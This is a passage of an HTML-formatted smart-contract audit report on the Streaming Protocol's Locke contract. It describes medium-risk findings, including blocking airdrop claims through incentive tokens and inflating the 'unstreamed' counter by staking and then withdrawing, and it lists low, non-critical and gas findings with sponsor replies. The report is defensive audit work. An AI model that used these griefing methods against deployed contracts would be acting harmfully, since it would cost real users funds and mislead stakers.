class=\"mtk1\">;</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/162#issuecomment-987041410\">brockelmore (Streaming Protocol) disputed</a>:</strong></p>\n<blockquote>\n<p>The intention is that the claim airdrop + transfer is done atomically. Compound-style governance contracts come with this ability out of the box.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/162#issuecomment-1013571214\">0xean (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Going to agree with the warden that as the code is written this is an appropriate risk to call out and be aware of.  Downgrading in severity because it relies on external factors but there is no on chain enforcement that this call will be operated correctly and therefore believe it represent a valid concern even if the Sponsor has a mitigation plan in place.</p>\n</blockquote>\n<h2 id=\"m-03-this-protocol-doesnt-support-all-fee-on-transfer-tokens\" style=\"position:relative;\"><a href=\"#m-03-this-protocol-doesnt-support-all-fee-on-transfer-tokens\" aria-label=\"m 03 this protocol doesnt support all fee on transfer tokens permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/192\">[M-03] This protocol doesn’t support all fee on transfer tokens</a></h2>\n<p><em>Submitted by 0x0x0x</em></p>\n<p>Some fee on transfer tokens, do not reduce the fee directly from the transferred amount, but subtracts it from remaining balance of sender. Some tokens prefer this approach, to make the amount received by the recipient an exact amount. Therefore, after funds are send to users, balance becomes less than it should be. So this contract does not fully support fee on transfer tokens. With such tokens, user funds can get lost after transfers.</p>\n<h4 id=\"mitigation-step\" style=\"position:relative;\"><a href=\"#mitigation-step\" aria-label=\"mitigation step permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Mitigation step</h4>\n<p>I don’t recommend directly claiming to support fee on transfer tokens. Current contract only supports them, if they reduce the fee from the transfer amount.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/192#issuecomment-989261382\">brockelmore (Streaming Protocol) acknowldedged</a>:</strong></p>\n<blockquote>\n<p>We will make this clear for stream creators</p>\n</blockquote>\n<h2 id=\"m-04-arbitrarycall-can-get-blocked-by-an-attacker\" style=\"position:relative;\"><a href=\"#m-04-arbitrarycall-can-get-blocked-by-an-attacker\" aria-label=\"m 04 arbitrarycall can get blocked by an attacker permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/47\">[M-04] arbitraryCall() can get blocked by an attacker</a></h2>\n<p><em>Submitted by GiveMeTestEther, also found by ScopeLift</em></p>\n<h4 id=\"impact-10\" style=\"position:relative;\"><a href=\"#impact-10\" aria-label=\"impact 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h4>\n<p><code>arbitraryCall()</code>’s (L733) use case is to claim airdrops by “gov”. If the address “who” is a token that could be send as an incentive by an attacker via <code>createIncentive()</code> then such claim can be made unusable, because on L735 there is a <code>require(incentives\\[who] == 0, \"inc\");</code> that reverts if a “who” token was received as an incentive.</p>\n<p>In this case the the <code>incentives\\[who]</code> can be set to 0 by the stream creator by calling <code>claimIncentive()</code> but only after the stream has ended according to <code>require(block.timestamp >= endStream, \"stream\");</code> (L520)</p>\n<p>If the airdrop is only claimable before the end of the stream, then the airdrop can never be claimed.</p>\n<p>If “gov” is not the stream creator then the stream creator must become also the “gov” because <code>claimIncentive()</code> only can be called by the stream creator and the <code>arbitraryCall()</code> only by “gov”. If resetting <code>incentives\\[who]</code> to 0 by calling <code>claimIncentive()</code> and <code>arbitraryCall()</code> for the “who” address doesn’t happen atomic, an attacker can send between those two calls again a “who” token.</p>\n<h4 id=\"proof-of-concept-11\" style=\"position:relative;\"><a href=\"#proof-of-concept-11\" aria-label=\"proof of concept 11 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h4>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L733\">https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L733</a></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L500\">https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L500</a></li>\n</ul>\n<h4 id=\"recommended-mitigation-steps-10\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-10\" aria-label=\"recommended mitigation steps 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h4>\n<ul>\n<li>Best option at the moment I can think of is to accept the risk but clearly communicate to users that this can happen</li>\n</ul>\n<p><strong><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/47#issuecomment-984102392\">brockelmore (Streaming Protocol) acknowledged</a>:</strong></p>\n<blockquote>\n<p>Yep this is the tradeoff being made. To maintain trustlessness, we cannot remove the <code>incentives[who] == 0</code> check. Additionally, governance shouldn’t be in charge of an arbitrary stream’s <code>recoverTokens</code> function. </p>\n<p>The upshot of this is most <code>MerkleDrop</code> contracts are generally external of the token itself and not baked into the ERC20 itself. If a user wants to grief governance, they could continuously <code>createIncentive</code> after the stream creator claims the previous. But it does cost the user.</p>\n</blockquote>\n<h2 id=\"m-05-storage-variable-unstreamed-can-be-artificially-inflated\" style=\"position:relative;\"><a href=\"#m-05-storage-variable-unstreamed-can-be-artificially-inflated\" aria-label=\"m 05 storage variable unstreamed can be artificially inflated permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/118\">[M-05] Storage variable unstreamed can be artificially inflated</a></h2>\n<p><em>Submitted by harleythedog, also found by csanuragjain, gpersoon, hubble, and WatchPug</em></p>\n<h4 id=\"impact-11\" style=\"position:relative;\"><a href=\"#impact-11\" aria-label=\"impact 11 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h4>\n<p>The storage variable <code>unstreamed</code> keeps track of the global amount of deposit token in the contract that have not been streamed yet. This variable is a public variable, and users that read this variable likely want to use its value to determine whether or not they want to stake in the stream.</p>\n<p>The issue here is that <code>unstreamed</code> is incremented on calls to <code>stake</code>, but it is not being decremented on calls to <code>withdraw</code>. As a result, a malicious user could simply stake, immediately withdraw their staked amount, and they will have increased <code>unstreamed</code>. They could do this repeatedly or with large amounts to intentionally inflate <code>unstreamed</code> to be as large as they want.</p>\n<p>Other users would see this large amount and be deterred to stake in the stream, since they would get very little reward relative to the large amount of unstreamed deposit tokens that <em>appear</em> to be in the contract. This benefits the attacker as less users will want to stake in the stream, which leaves more rewards for them.</p>\n<h4 id=\"proof-of-concept-12\" style=\"position:relative;\"><a href=\"#proof-of-concept-12\" aria-label=\"proof of concept 12 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h4>\n<p>See <code>stake</code> here: <a href=\"https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L417\">https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L417</a></p>\n<p>See <code>withdraw</code> here: <a href=\"https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L455\">https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L455</a></p>\n<p>Notice that <code>stake</code> increments <code>unstreamed</code> but <code>withdraw</code> does not affect <code>unstreamed</code> at all, even though <code>withdraw</code> is indeed removing unstreamed deposit tokens from the contract.</p>\n<h4 id=\"tools-used-5\" style=\"position:relative;\"><a href=\"#tools-used-5\" aria-label=\"tools used 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h4>\n<p>Inspection</p>\n<h4 id=\"recommended-mitigation-steps-11\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-11\" aria-label=\"recommended mitigation steps 11 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h4>\n<p>Add the following line to <code>withdraw</code> to fix this issue:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"18\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">unstreamed -= amount;</span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/118#issuecomment-989286529\">brockelmore (Streaming Protocol) confirmed</a></strong></p>\n<h1 id=\"low-risk-findings-27\" style=\"position:relative;\"><a href=\"#low-risk-findings-27\" aria-label=\"low risk findings 27 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Low Risk Findings (27)</h1>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/145\">[L-01] Avoid fee </a> <em>Submitted by Jujic</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/221\">[L-02] Loss of precision causing incorrect flashloan &#x26; creator fee calculation</a> <em>Submitted by hack3r-0m, also found by Jujic and toastedsteaksandwich</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/136\">[L-03] Missing address(0) check can, lead to user transfering token to the burn address, and doesnt reduce the total supply</a> <em>Submitted by Omik, also found by pauliax</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/26\">[L-04] Missing zero Address check </a> <em>Submitted by cyberboy</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/204\">[L-05] Token owner cannot claim rewardToken if they are not the original depositor</a> <em>Submitted by gzeon</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/73\">[L-06] Stream.sol: possible tx.origin attack vector via recoverTokens()</a> <em>Submitted by itsmeSTYJ</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/20\">[L-07] constructor should guard against zero addresses</a> <em>Submitted by jayjonah8</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/246\">[L-08] Incorrect Validation of feePercent</a> <em>Submitted by mtz, also found by hubble and kenzo</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/66\">[L-09] Free flashloan for governance</a> <em>Submitted by 0x1f8b</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/94\">[L-10] Inaccuate comment about claimFees()</a> <em>Submitted by GeekyLumberjack</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/41\">[L-11] depositTokens need to have a decimals() function</a> <em>Submitted by GiveMeTestEther</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/78\">[L-12] TODOs List May Leak Important Info &#x26; Errors</a> <em>Submitted by Meta0xNull, also found by robee and pauliax</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/112\">[L-13] Governance has the ability to withdraw tokens the stream doesn’t know about</a> <em>Submitted by Ruhum</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/213\">[L-14] Inaccurate comment in <code>recoverTokens</code></a> <em>Submitted by cmichel</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/28\">[L-15] Division before multiple can lead to precision errors</a> <em>Submitted by cyberboy</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/114\">[L-16] flashLoan does not have a return statement</a> <em>Submitted by defsec</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/117\">[L-17] Use of ecrecover is susceptible to signature malleability</a> <em>Submitted by defsec</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/252\">[L-18] Incompatibility With Rebasing/Deflationary/Inflationary tokens</a> <em>Submitted by defsec</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/124\">[L-19] prevent rounding error</a> <em>Submitted by gpersoon</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/271\">[L-20] balance(dust) rewardsTokens may be unclaimable after endRewardLock</a> <em>Submitted by hubble</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/19\">[L-21] Floating Pragma is set.</a> <em>Submitted by cyberboy, also found by Jujic, defsec, hyh, robee, and mtz</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/68\">[L-22] Missing zero-address checks on LockeERC20 and Stream construction</a> <em>Submitted by hyh, also found by Meta0xNull and 0x1f8b</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/147\">[L-23] <code>rewardPerToken()</code> reverts before start time.</a> <em>Submitted by jonah1005</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/102\">[L-24] Wrong comment in claimReward</a> <em>Submitted by kenzo</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/98\">[L-25] Global unstreamed variable not kept up to date</a> <em>Submitted by kenzo</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/125\">[L-26] parameter “who” not used</a> <em>Submitted by gpersoon, also found by GiveMeTestEther, pauliax, pedroais, Meta0xNull, bitbopper, hack3r-0m, and wuwe1</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/110\">[L-27] LockeERC20 name is not implemented as comment imply</a> <em>Submitted by wuwe1</em></li>\n</ul>\n<h1 id=\"non-critical-findings-23\" style=\"position:relative;\"><a href=\"#non-critical-findings-23\" aria-label=\"non critical findings 23 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Non-Critical Findings (23)</h1>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/65\">[N-23] Deny of service because integer overflow</a> <em>Submitted by 0x1f8b</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/140\">[N-01] Missing contract check on <code>rewardtoken</code></a> <em>Submitted by Omik</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/77\">[N-02] creatorClaimSoldTokens() Does Not Check Destination Address</a> <em>Submitted by Meta0xNull</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/201\">[N-03] Incentives paid to creator instead of depositor</a> <em>Submitted by gzeon</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/72\">[N-04] Governed.sol: setPendingGov() should use the emergency_governed modifier.</a> <em>Submitted by itsmeSTYJ</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/62\">[N-05] Use _notSameBlock</a> <em>Submitted by 0x1f8b</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/135\">[N-06] Missing address(0) check, can crippled the governed functions</a> <em>Submitted by Omik</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/130\">[N-07] Flash loan mechanics do not implement any standard</a> <em>Submitted by hyh</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/150\">[N-08] <code>LockeERC20.transfer()</code> and <code>LockeERC20.transferFrom()</code> emit <code>Transfer</code> events when the transferred amount is zero</a> <em>Submitted by pants</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/151\">[N-09] <code>LockeERC20.transferFrom()</code> emits <code>Transfer</code> events when <code>from</code> equals <code>to</code></a> <em>Submitted by pants</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/153\">[N-10] <code>LockeERC20.approve()</code> and <code>LockeERC20.permit()</code> emit <code>Approval</code> events when the allowence hasn’t changed</a> <em>Submitted by pants</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/157\">[N-11] <code>Governed.setPendingGov()</code> emits <code>NewPendingGov</code> events when the pending governor hasn’t changed</a> <em>Submitted by pants</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/158\">[N-12] <code>Governed.acceptGov()</code> emits <code>NewGov</code> events when the governor hasn’t changed</a> <em>Submitted by pants</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/159\">[N-13] <code>Governed</code>’s constructor doesn’t emit an initial <code>NewGov</code> event</a> <em>Submitted by pants</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/161\">[N-14] <code>Governed</code> doesn’t implement the <code>IGoverned</code> interface</a> <em>Submitted by pants</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/234\">[N-15] Implementations should inherit their interface</a> <em>Submitted by WatchPug</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/236\">[N-16] Constructors should not have visibility</a> <em>Submitted by WatchPug</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/243\">[N-17] Insufficient input validation</a> <em>Submitted by WatchPug</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/249\">[N-18] Inconsistent check of token balance</a> <em>Submitted by WatchPug</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/226\">[N-19] Emergency gov is never used</a> <em>Submitted by csanuragjain, also found by kenzo and wuwe1</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/32\">[N-20] Missing NatSpec comments</a> <em>Submitted by cyberboy</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/35\">[N-21] Missing Emit in critical function</a> <em>Submitted by cyberboy</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/30\">[N-22] Typos</a> <em>Submitted by wuwe1</em></li>\n</ul>\n<h1 id=\"gas-optimizations-53\" style=\"position:relative;\"><a href=\"#gas-optimizations-53\" aria-label=\"gas optimizations 53 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Gas Optimizations (53)</h1>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/31\">[G-01] Use inmutable keyword</a> <em>Submitted by 0x1f8b</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/260\">[G-02] Code Style: public functions not used by current contract should be external</a> <em>Submitted by WatchPug, also found by Jujic, cyberboy, pedroais, robee, and defsec</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/143\">[G-03] ”> 0” is less efficient than “!= 0” for unsigned integers</a> <em>Submitted by ye0lde, also found by 0x0x0x, Jujic, pedroais, and pmerkleplant</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/185\">[G-04] No need to check fee inside factories constructor</a> <em>Submitted by 0x0x0x, also found by csanuragjain</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/186\">[G-05] fundStream can be implemented more efficiently</a> <em>Submitted by 0x0x0x</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/187\">[G-06] When exit is called, updateStream is called twice</a> <em>Submitted by 0x0x0x, also found by WatchPug, kenzo, and pauliax</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/188\">[G-07] Directly calculate fee in flash loan</a> <em>Submitted by 0x0x0x, also found by 0x1f8b, GeekyLumberjack, WatchPug, cmichel, danb, and pauliax</em></li>\n<li><a 